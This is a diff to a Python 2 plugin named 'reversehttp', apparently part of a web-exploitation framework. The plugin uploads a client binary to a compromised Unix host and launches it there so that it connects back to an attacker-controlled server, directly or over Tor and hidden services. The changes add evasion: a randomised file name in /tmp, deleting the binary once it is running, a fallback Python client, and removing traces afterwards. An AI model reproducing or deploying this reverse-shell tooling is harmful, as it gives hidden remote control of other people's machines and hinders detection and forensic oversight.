@@ -29,8 +29,8 @@
 
 
 from plugininterface import basePlugin
-import os, os.path,time, sys
-
+import os, os.path,time, sys, random, inspect
+import inspect
 
 class reversehttp(basePlugin):
 
@@ -80,6 +80,16 @@ class reversehttp(basePlugin):
 		if dest_port!="": self.port=dest_port
 		
 
+    def random_string(self,length):
+        alphabet = 'abcdefghijklmnopqrstuvwxyz1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ'
+        min = 1
+        max = 1
+        total = length
+        string=''
+        for count in xrange(1,total):
+          for x in random.sample(alphabet,random.randint(min,max)):
+              string+=x
+        return string
 	
         
     def plugin_callback_handler(self, callbackstring, haxhelper):
@@ -91,11 +101,8 @@ class reversehttp(basePlugin):
         if (callbackstring == "reversehttp.reverse_http"):
             
             if (haxhelper.isUnix()):
-		try:
-		        pytor_path=os.environ['PYTOR_PATH']
-		except KeyError:
-			print "PYTOR_PATH env. variable is not set. I cannot continue"
-			return 1
+		pytor_path= "%s/pytor" % os.path.dirname(inspect.getfile(inspect.currentframe()))
+
 		os.chdir(pytor_path)
 		if not os.path.isfile("./bin/client"):
 			print "Client is not compiled yet..."
@@ -105,25 +112,39 @@ class reversehttp(basePlugin):
 				return 1
 
 		self.request_parameters()
+		rand_name="/tmp/%s" % (self.random_string(12))
 
-		print "Uploading client..."
-		bytes = haxhelper.uploadfile("./bin/client", "/tmp/client", chunksize=1024)
+		print "Uploading client to %s  ..." % rand_name
+		bytes = haxhelper.uploadfile("./bin/client", rand_name, chunksize=1024)
 		print "Uploaded %s bytes" % bytes
-		haxhelper.executeSystemCommand("chmod 700 /tmp/client")
+		haxhelper.executeSystemCommand("chmod 700 %s" % rand_name)
 
 		if self.tor==True:
     			if self.hidden_service=="":
-				env_string="TOR_MODE='yes'" 
+				env_string="NEXT_REQUEST=1 TOR_MODE='yes'" 
 			else:
-				env_string="HIDDEN_SERVICE='%s' TOR_MODE='yes'" % (self.hidden_service)
+				env_string="NEXT_REQUEST=1 HIDDEN_SERVICE='%s' TOR_MODE='yes'" % (self.hidden_service)
 		else:
-			env_string="PYSERVER_IP='%s' PYSERVER_PORT='%s'" % (self.server,self.port)
+			env_string="NEXT_REQUEST=1 PYSERVER_IP='%s' PYSERVER_PORT='%s'" % (self.server,self.port)
 
 
-		print " executing: %s  /tmp/client -c1 &" % (env_string)
-		print haxhelper.executeSystemCommand("%s  /tmp/client -c 1 &" % (env_string))
+		print " %s  %s &" % (env_string, rand_name)
+		print haxhelper.executeSystemCommand(" %s  %s  &" % (env_string, rand_name))
+		print haxhelper.executeSystemCommand("rm -rvf %s" % rand_name)
+		time.sleep(5)
+		if haxhelper.executeSystemCommand("pgrep  %s" % rand_name)=="":
+			print "Unable to run the client. Perhaps the readline bug? Fallingback to the python script"
+			print "Uploading client to %s  ..." % rand_name
+			bytes = haxhelper.uploadfile("./build/client.py", rand_name, chunksize=1024)
+			print "Uploaded %s bytes" % bytes
+			print haxhelper.executeSystemCommand(" %s python  %s  &" % (env_string, rand_name))
+			print haxhelper.executeSystemCommand("rm -rvf %s" % rand_name)
+
+
 		print "Running the server. Execute 'quit' to stop the client and then CTRL+C to stop the server :)"
-		os.system("./bin/server")
+		os.system("SERVER_MODE=yes ./src/pytor.py")
+		print "Deleting traces..."
+		print haxhelper.executeSystemCommand("rm -rvf /tmp/pytor*")
 
 
             else:
